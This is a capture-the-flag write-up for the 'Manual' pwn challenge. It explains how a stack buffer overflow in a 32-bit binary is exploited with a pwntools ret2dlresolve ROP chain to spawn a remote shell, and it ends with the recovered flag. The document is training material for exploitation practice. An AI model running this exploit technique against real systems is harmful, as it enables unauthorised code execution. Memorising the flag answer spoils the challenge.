# Manual
---

### Challenge Description

No gadgets?

nc challenge1.lagncrash.com 10001

[manual.zip](https://github.com/caprinux/LagNCrash/files/6129967/manual.zip)

---

### Solution

We are provided with the source code and the binary ELF executable once again.

You know the drill.

```c
$ pwn checksec manual
[*] '/media/sf_Kali_Linux/manual'

    Arch:     i386-32-little

    RELRO:    No RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```C
#include <stdio.h>
#include <unistd.h>
int main(int argc, char** argv){
	vuln();
}

int vuln(void){
	char buf[128];
	read(0, buf, 300);
	return 0;
}
```

Okay, we tried many things, from trying some ROP to spamming support tickets to ask for libc library, but there was something we weren't seeing.

Legend has it that: When in doubt, google.

If you attempt to copy the whole checksec into google, the very second entry provides a writeup to a similar challenges. 

After reading it for some time, we realise that this challenge had something to do with ``RET2DLRESOLVE``.

Once again, when in doubt, google.

After looking around for quite some time, we arrive at a [pwntools page on ret2dlresolve](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html). 

After reading for some time again, we figured that this was what we were looking for.

This pwntool page featured a block of code using ret2dlresolve to pwn an example code that looked just like manual.

As a script kiddie, I copied the code from the website and tried to implement it for manual.

What I copied from the site:

```py
>>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
>>> rop = ROP(context.binary)
>>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
>>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
>>> rop.ret2dlresolve(dlresolve)
>>> raw_rop = rop.chain()
>>> print(rop.dump())
0x0000:        0x80482e0 read(0, 0x804ae00)
0x0004:        0x80484ea <adjust @0x10> pop edi; pop ebp; ret
0x0008:              0x0 arg0
0x000c:        0x804ae00 arg1
0x0010:        0x80482d0 [plt_init] system(0x804ae24)
0x0014:           0x2b84 [dlresolve index]
0x0018:          b'gaaa' <return address>
0x001c:        0x804ae24 arg0
>>> p = elf.process()
>>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
>>> p.recvline()
b'pwned\n'
```

After clearing some stuff and changing into a script format, we get:
```py
from pwn import *
context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())
p = elf.process()
p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
p.recvline()
```

We change some of the more obvious stuff, such as changing the offsets from 64 to 128 and 200 to 300 according to the manual source code.
We change the argument from echo pwned to /bin/bash so we can get shell.
We change elf.process such that it connects to the remote server.
Now we execute the following:

```py
from pwn import *
context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/bash"])
rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())
p = remote('challenge1.lagncrash.com', 10001)
p.sendline(fit({128+context.bytes*3: raw_rop, 300: dlresolve.payload}))
p.recvline()
```

We receive an error.

```py
Traceback (most recent call last):

  File "/media/sf_Kali_Linux/testingformanual", line 2, in <module>

    context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))

  File "/usr/local/lib/python3.9/dist-packages/pwnlib/elf/elf.py", line 215, in __init__

    self.file = open(path,'rb')

FileNotFoundError: [Errno 2] No such file or directory: '/usr/local/lib/python3.9/dist-packages/pwnlib/data/elf/ret2dlresolve/i386'
```

With some googling, we managed to find that ELF actually can just take in a binary file.

Hence we replace pwnlib.data.elf.ret2dlresolve.get('i386') with 'manual'

We execute it again and this time we connected to the shell and nothing happens.

Looks like we forgot to change p.recvline() to p.interactive()


```py
from pwn import *

context.binary = elf = ELF('manual')

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/bash"])
rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())

p = remote('challenge1.lagncrash.com', 10001)
p.sendline(fit({128+context.bytes*3: raw_rop, 300: dlresolve.payload}))
p.interactive()
```

We now get a shell and if we list the files in the pwd, we see flag.txt.

We open flag.txt and we get the flag.

```
$ cat flag.txt
LNC{R350Lv3_7h15_4_M3}
```



